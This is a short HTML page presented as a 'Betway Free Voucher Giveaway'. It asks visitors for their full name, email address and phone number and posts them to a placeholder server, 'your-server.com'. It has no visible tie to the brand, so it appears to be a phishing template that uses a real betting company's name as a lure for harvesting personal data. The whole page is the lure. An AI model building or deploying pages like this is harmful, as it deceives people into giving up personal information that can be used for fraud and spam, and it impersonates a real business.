<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Betway Free Voucher Giveaway</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }
        .giveaway-container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .giveaway-container h2 {
            margin-bottom: 20px;
        }
        .giveaway-container p {
            margin-bottom: 20px;
        }
        .giveaway-container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        .giveaway-container button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        .giveaway-container button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="giveaway-container">
        <h2>Betway Free Voucher Giveaway</h2>
        <p>Enter your details to claim your free voucher!</p>
        <form action="https://your-server.com/process.php" method="post">
            <input type="text" name="name" placeholder="Full Name" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="text" name="phone" placeholder="Phone Number" required>
            <button type="submit">Claim Your Voucher</button>
        </form>
    </div>
</body>
</html>
